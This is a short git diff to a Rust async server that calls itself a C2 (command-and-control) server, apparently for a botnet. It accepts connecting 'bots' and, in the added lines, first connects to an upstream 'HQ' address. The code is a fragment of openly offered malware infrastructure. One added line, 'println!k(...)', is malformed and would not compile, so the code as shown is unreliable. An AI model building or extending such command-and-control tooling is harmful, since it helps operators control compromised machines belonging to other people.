@@ -173,14 +173,24 @@ async fn receive_bot_data(
 
 #[tokio::main]
 pub async fn main() -> Result<(), Box<dyn Error>> {
+
+    println!k("Connecting to HQ"); // lisandro : make a function out of it
+    let mut connector = net::TcpStream::connect(HQ);
+    match connector {
+        Ok(mut socket) => {
+            println!("Connected to HQ");
+        },
+        Err(err) => {
+            println!("Could not connect to HQ : {}", err);
+        }
+    };
+
     let listener = tokio::net::TcpListener::bind(LOCAL).await?;
     let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
     let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
-
-    //let (bot_input_sender, bot_input_receiver) = broadcast::channel(64);
     println!("C2 Server Initialized");
     loop {
-        // User accept
+        // edode : Accepting the new bot
         let (socket, addr) = listener.accept().await?;
 
         println!("New user connected: {}", addr);
